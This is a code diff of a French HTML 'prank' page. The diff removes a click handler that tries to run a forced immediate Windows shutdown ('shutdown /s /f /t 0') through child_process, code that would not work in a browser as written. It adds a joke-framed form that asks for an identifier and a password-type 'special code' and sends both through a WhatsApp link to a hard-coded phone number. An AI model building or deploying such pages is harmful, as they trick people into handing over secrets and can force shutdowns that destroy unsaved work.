@@ -3,39 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <title>Surprise!</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 </head>
-<body>
-    <button onclick="showPrankForm()">Clique ici!</button>
+<body class="flex items-center justify-center min-h-screen bg-gray-100">
+    <button onclick="showPrankForm()" class="px-6 py-3 text-white bg-blue-500 rounded-lg hover:bg-blue-600 focus:outline-none">
+        Clique ici!
+    </button>
 
-    <div id="prankForm" style="display: none;">
-        <h2>Formulaire de Blague</h2>
-        <p>Pour continuer, entrez les informations suivantes :</p>
-        <label>Identifiant secret de l’amitié :</label>
-        <input type="text" id="friendId" placeholder="ex: 123-amitié"><br><br>
+    <div id="prankForm" style="display: none;" class="mt-6 p-6 bg-white shadow-lg rounded-lg w-80">
+        <h2 class="text-lg font-bold text-gray-700 mb-4">Formulaire de Blague</h2>
+        <p class="text-sm text-gray-500 mb-6">Pour continuer, entrez les informations suivantes :</p>
         
-        <label>Code spécial de blague :</label>
-        <input type="password" id="prankCode" placeholder="******"><br><br>
+        <label class="block text-sm font-medium text-gray-700">Identifiant secret de l’amitié :</label>
+        <input type="text" id="friendId" placeholder="ex: 123-amitié" class="mt-1 block w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400 mb-4">
         
-        <button onclick="submitPrankForm()">Soumettre</button>
+        <label class="block text-sm font-medium text-gray-700">Code spécial de blague :</label>
+        <input type="password" id="prankCode" placeholder="******" class="mt-1 block w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400 mb-4">
+        
+        <button onclick="sendMessage()" class="px-4 py-2 bg-green-500 text-white rounded-lg hover:bg-green-600">
+            Envoyer le message
+        </button>
     </div>
 
     <script>
         function showPrankForm() {
-            const { exec } = require('child_process');
+            document.getElementById("prankForm").style.display = "block";
+            alert('Surprise! Tu as cliqué sur le bouton!');
+        }
 
-            // Commande pour fermer toutes les fenêtres et éteindre l'ordinateur
-            // Pour Windows
-            exec('shutdown /s /f /t 0', (error, stdout, stderr) => {
-                if (error) {
-                    console.error(`Erreur : ${error.message}`);
-                    return;
-                }
-                if (stderr) {
-                    console.error(`Erreur : ${stderr}`);
-                    return;
-                }
-                console.log(`Succès : ${stdout}`);
-            });
+        function sendMessage() {
+            const friendId = document.getElementById("friendId").value;
+            const prankCode = document.getElementById("prankCode").value;
+
+            if (friendId && prankCode) {
+                // Crée un message pré-rempli avec les informations de la blague
+                const message = `Identifiant: ${friendId}, Code: ${prankCode}`;
+                const phoneNumber = "33783320708"; // Remplace par ton numéro au format international, par exemple, "33612345678" pour +33 6 12 34 56 78
+                const url = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
+
+                // Ouvre le lien WhatsApp
+                window.open(url, "_blank");
+            } else {
+                alert("Veuillez entrer l'identifiant et le code !");
+            }
         }
     </script>
 </body>
